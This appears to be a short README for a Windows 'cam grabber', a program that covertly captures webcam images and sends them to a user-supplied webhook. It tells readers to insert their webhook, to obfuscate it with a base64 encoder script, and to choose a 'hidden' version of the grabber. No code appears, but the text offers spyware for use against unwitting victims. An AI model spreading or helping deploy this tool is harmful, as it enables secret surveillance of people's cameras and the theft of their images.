All you have to do here is download the file and run it. 
But before you do that change the webhook inside the script `YOUR_WEBHOOK`
and also download the `base64webhookencoder.py` to obfuscate your webhook a little bit
This script works on windows only and it will install everything for you :)
the cam.py is the "hidden" version of the cam grabber.
if you just want the raw cam grabbing then download camgrabber.py
